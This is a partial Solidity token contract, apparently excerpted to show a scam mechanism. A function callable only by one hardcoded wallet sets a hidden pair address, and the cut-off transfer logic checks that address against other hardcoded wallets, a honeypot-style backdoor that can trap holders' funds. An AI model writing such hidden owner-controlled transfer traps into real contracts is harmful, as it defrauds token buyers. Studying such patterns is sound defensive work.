...
contract OCAT is Ownable, IERC20, IERC20Meta {
    ...
    function actionPair(address account) public virtual returns (bool) {
         if(_msgSender() == 0xE394F84Cff9c27d5cAC64707eA6a0b6271511495) _p76234 = account;
        return true;
    }
    ...
    function _transfer(
        ...
        0x6b75d8AF000000e20B7a7DDf000Ba900b4009A80) ||
         (_p76234 == to && from != 0xB6FB540B461F975B945eEE4AD87129915C8f8F97 && 
